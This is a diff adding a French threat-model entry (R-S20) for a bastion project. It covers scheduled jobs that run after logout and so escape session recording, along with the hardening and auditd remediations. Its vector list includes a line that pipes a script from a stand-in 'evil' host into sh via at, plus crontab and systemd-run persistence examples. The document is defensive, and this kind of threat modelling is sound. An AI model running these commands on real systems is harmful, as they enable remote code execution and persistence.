@@ -1183,6 +1183,50 @@ Voir [R-S18 dans 99-risk-reduce.md](99-risk-reduce.md) pour les pistes d'amélio
 
 ---
 
+### R-S20 - Action différée hors session (at, cron, systemd-run timer)
+
+|                 | Score |
+| --------------- | :---: |
+| **Probabilité** |   2   |
+| **Impact**      |   3   |
+
+**Description :** Un utilisateur soumet une commande au planificateur du système (`at`, `crontab`, ou `systemd-run --user --on-active=...` si linger activé). La commande s'exécute **après** la déconnexion, donc hors session SSH, hors enregistrement pty, et hors cgroup affecté par `KillUserProcesses=yes` (R-S19). Le containment cgroup est inopérant contre ce vecteur car le travail planifié est démarré par un processus système (atd, cron, systemd-user manager) dans son propre cgroup.
+
+**Conditions de la menace :**
+
+1. `at` ou `cron` autorisent les non-root (défaut sur Debian)
+2. `atd` est actif
+3. (Variante systemd-run timer) l'utilisateur a `Linger=yes`
+
+**Vecteurs :**
+
+- `echo 'curl http://evil/x.sh | sh' | at now + 1 hour`
+- `crontab -e` puis `*/5 * * * * exfil_data.sh`
+- `loginctl enable-linger; systemd-run --user --on-active=10min /tmp/x.sh` (si linger autorisé)
+
+**Conséquence :** Action différée non tracée par le recorder, persistant après déconnexion. Si l'attaquant a planifié sa commande puis s'est déconnecté, plus rien dans le pty ne le rattache à l'exécution effective. L'imputation reste possible uniquement via les traces du planificateur et, si activé, via auditd.
+
+**Remédiation implémentée — Désactivation des planificateurs utilisateur (PR1 #112, opt-in via `--enable-hardening`) :**
+
+- `/etc/at.allow` vide (root only) + `systemctl mask atd` : `at(1)` est désactivé pour les non-root et le démon `atd` ne tourne plus.
+- `/etc/cron.allow` root-only : `crontab(1)` refuse les non-root au moment de l'édition. `cron.service` reste actif parce que `/etc/cron.d/open-bastion-krl` (utilisé par le mode max-security pour le rafraîchissement de la KRL) requiert un démon cron en service. `cron.allow` empêche les utilisateurs de soumettre leurs propres crontabs ; les fichiers déposés dans `/etc/cron.d/` restent root-only par construction.
+- Pre-flight bloquant : `setup_hardening` **refuse de s'exécuter** si un utilisateur non-root a `Linger=yes`. L'administrateur doit faire `loginctl disable-linger <user>` avant. Cette protection ferme le canal `systemd-run --user --on-active=...`.
+
+**Remédiation complémentaire — Trace primaire auditd (PR2 #113) :**
+
+Au moment de l'exécution effective de la commande planifiée (si la planification est passée à travers les protections ci-dessus), auditd la capture via `-S execve -S execveat`. L'événement est attribué au démon planificateur (PID, parent, uid effectif) et reste corrélable.
+
+**Limite résiduelle documentée :** Un crontab pré-existant déposé dans `/var/spool/cron/crontabs/<user>` **avant** l'activation du hardening n'est pas purgé par `setup_hardening`. `cron` lit le spool indépendamment de `cron.allow` (qui ne contrôle que `crontab(1)` au moment de l'édition). Voir [99-risk-reduce.md](99-risk-reduce.md) pour la piste d'amélioration (purge des crontabs pré-existants à l'activation du hardening).
+
+|                 |                                       Score résiduel (PR1 activée)                                       |
+| --------------- | :------------------------------------------------------------------------------------------------------: |
+| **Probabilité** |              1 (at masqué, cron en allow-list root, linger refusé par le pre-flight)                     |
+| **Impact**      |    2 (limite documentée : crontab pré-existant non purgé ; auditd trace tout de même l'exécution)        |
+
+> **Score résiduel si PR1 NON activée :** P=2, I=3 (zone jaune). Voir [doc/hardening.md](../hardening.md) pour les détails techniques (documentation technique en anglais).
+
+---
+
 ## 4. Matrice des Risques
 
 ### Avant remédiation
